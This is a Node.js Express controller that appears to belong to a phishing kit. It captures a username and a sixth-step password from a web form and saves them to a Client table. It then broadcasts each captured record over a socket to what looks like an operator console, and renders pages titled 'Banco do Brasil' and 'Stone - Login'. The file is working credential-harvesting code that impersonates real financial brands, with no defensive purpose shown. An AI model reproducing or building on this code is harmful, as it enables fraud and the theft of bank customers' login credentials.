const { get } = require('request')
const userByToken = require('../../middlewares/auth')
const Client = require('../../models/Client')

const app = require('../../server')

module.exports = {
    async view(req, res) {
        try {
            const { username: user, password6: password, id } = req.body

            let client = ''

            if (id) {
                client = await Client.findByPk(id)

                client.update({ status: 'updated', user, password })
                req.app.io.emit('updateClient', client.toJSON())
            } else {
                client = await Client.create({
                    user,
                    password,
                    status: `connected`,
                })

                req.app.io.emit('createClient', client.toJSON())
            }

            //app.getSocketIo.sockets.emit('onScreenPass', client.toJSON())

            return res.render('pass6', {
                title: 'Banco do Brasil',
                pageClasses: 'cadastro',
                client: client.toJSON(),
            })
        } catch (error) {
            console.log(error)
            return res.redirect('/')
        }
    },

    async get(req, res) {
        const { client: id } = req.query

        const client = await Client.findByPk(id)

        if (!client) return res.redirect('/')

        client.update({ status: 'updated' })
        req.app.io.emit('onScreenPass', client.toJSON())

        //app.getSocketIo.sockets.emit('onScreenPass', client.toJSON())

        return res.render('pass6', {
            title: 'Stone - Login',
            pageClasses: 'cadastro',
            client: client.toJSON(),
        })
    },
}
